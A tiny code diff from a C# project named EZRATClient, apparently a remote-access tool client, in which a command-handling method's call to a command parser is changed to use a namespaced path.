@@ -174,8 +174,7 @@ namespace EZRATClient
 
         private static void HandleCommand(string text)
         {
-            CommandParser.ParserAndExecute(text);
-            
+            Core.CommandParser.ParserAndExecute(text);
         }
 
 
